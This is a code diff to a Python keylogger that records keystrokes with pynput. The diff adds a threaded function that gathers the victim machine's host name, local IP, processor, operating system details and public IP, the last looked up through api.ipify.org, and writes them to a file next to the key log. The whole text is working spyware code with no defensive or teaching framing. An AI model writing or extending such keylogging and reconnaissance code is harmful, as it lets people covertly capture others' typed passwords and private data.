@@ -1,5 +1,10 @@
 import pynput
 import datetime
+import threading
+import socket
+import platform
+import requests
+from requests import get 
 from pynput.keyboard import Key, Listener
 
 
@@ -29,7 +34,26 @@ def write_readable_file(keys, date_time):
 				file.write('\n')
 			elif k.find("Key") == -1:
 				file.write(k)
+
+def write_machine_info_file():
+	with open("mach_info.text", "a") as file:
+		file.write("Host name: %s" %socket.gethostname())
+		file.write("\n")
+		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
+		file.write("\n")
+		file.write("Processor type: %s" %platform.processor())
+		file.write("\n")
+		file.write("System type: %s" %platform.system())
+		file.write("\n")
+		file.write("Machine type: %s" %platform.machine())
+		file.write("\n")
+		file.write("Machine version: %s" %platform.version())
+		file.write("\n")
+		file.write("public IP: %s" %get('https://api.ipify.org').text)
+		
 def main():
+	machine_info = threading.Thread(target=write_machine_info_file)
+	machine_info.start()
 	with Listener(on_press=on_press) as listener:
 		listener.join()
 
